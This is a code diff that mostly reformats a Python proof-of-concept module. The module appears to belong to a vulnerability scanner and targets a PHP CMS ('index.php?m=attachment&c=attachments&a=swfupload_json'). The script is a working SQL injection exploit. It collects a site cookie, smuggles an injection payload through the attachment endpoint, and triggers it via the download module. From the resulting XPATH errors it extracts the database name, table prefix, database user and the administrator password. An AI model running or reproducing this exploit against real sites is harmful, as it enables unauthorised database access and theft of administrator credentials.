@@ -1,8 +1,14 @@
+import sys
+import urllib
+
+import requests
+
 from lib.core.data import target
-import requests,sys,urllib
+
+
 def poc():
     try:
-        if  not target.url.endswith("index.php"):
+        if not target.url.endswith("index.php"):
             print("[*] Please make sure the url end with 'index.php'")
             exit()
         url = target.url
@@ -15,11 +21,11 @@ def poc():
 
         step1 = url + '?m=wap&a=index&siteid=1'
         r = requests.get(step1)
-        post = {"userid_flash":r.cookies["GPYAh_siteid"]}
+        post = {"userid_flash": r.cookies["GPYAh_siteid"]}
         print('[+] Get Cookie : ' + r.cookies["GPYAh_siteid"])
 
-        step2  = url + "?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_info+ sqli_padding
-        r = requests.post(step2,data=post)
+        step2 = url + "?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_info + sqli_padding
+        r = requests.post(step2, data=post)
         sqli_payload = r.cookies["GPYAh_att_json"]
         print('[+] Get SQLi Payload : ' + sqli_payload)
 
@@ -29,31 +35,33 @@ def poc():
         db_start = html.find("SELECT * FROM `") + len("SELECT * FROM `")
         db_end = html.find("`.`")
         Database = html[db_start:db_end]
-        print("[+] Get Database Name: "+ Database)
+        print("[+] Get Database Name: " + Database)
 
         tableprefix_start = html.find("`.`") + len("`.`")
         tableprefix_end = html.find("_download_data")
         tableprefix = html[tableprefix_start:tableprefix_end]
-        print("[+] Get Table Prefix: "+ tableprefix)
+        print("[+] Get Table Prefix: " + tableprefix)
 
-        startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '")
+        startIndex = html.find("XPATH syntax error: '") + len(
+            "XPATH syntax error: '")
         endIndex = html.find("' <br /> <b>MySQL Errno")
         database_user = html[startIndex:endIndex]
         print("[+] Get Database-user Information : " + database_user)
 
-        step4  = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding
-        r = requests.post(step4,data=post)
+        step4 = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_password1 + tableprefix + sqli_password2 + sqli_padding
+        r = requests.post(step4, data=post)
         sqli_payload = r.cookies["GPYAh_att_json"]
 
         setp5 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
         html = requests.get(setp5).text
-        startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '")
+        startIndex = html.find("XPATH syntax error: '") + len(
+            "XPATH syntax error: '")
         endIndex = html.find("' <br /> <b>MySQL Errno")
         admin_passwd = html[startIndex:endIndex]
         print("[+] Get User Passwd: " + admin_passwd)
 
-        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
-
     except KeyError as e:
 
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
